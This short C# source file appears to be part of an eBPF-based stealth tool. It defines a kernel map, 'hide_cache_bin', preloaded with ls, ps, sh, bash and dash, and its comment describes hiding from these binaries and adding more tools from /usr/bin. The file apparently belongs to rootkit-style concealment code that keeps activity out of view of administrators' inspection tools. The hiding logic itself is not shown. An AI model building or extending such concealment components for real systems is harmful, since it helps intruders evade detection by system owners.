using System.Collections.ObjectModel;
using System.Text;
using Deamon.Ebpf.Config;
using Deamon.Ebpf.Utils;
using Deamon.Utils;
using Mango.Interops;

namespace Deamon.Ebpf.Mapping;

/// <summary>
/// Hide from binaries. Ex : Ls, Ps, etc.
/// 
/// Use ls -la /usr/bin or other folders containing usefull binaries to add them in default values.
/// </summary>
internal sealed class MapCacheHideBin() : BaseMapConfig(BpfMapType.Hash)
{
    private static readonly ReadOnlyCollection<string> binaries = ["ls", "ps", "sh", "bash", "dash"]; //use other.

    public override string Name => "hide_cache_bin";

    public override string Description => "Binary to hide";

    public override IReadOnlyDictionary<byte[], byte[]> AddDefaultKeyValuesOnLoad()
        => binaries.ToDictionary(str => StrUtils.ToFixedKeySize(str, EbpfConstant.DnameMaxBytes), str => EbpfUtils.ToBytes((byte)1));
}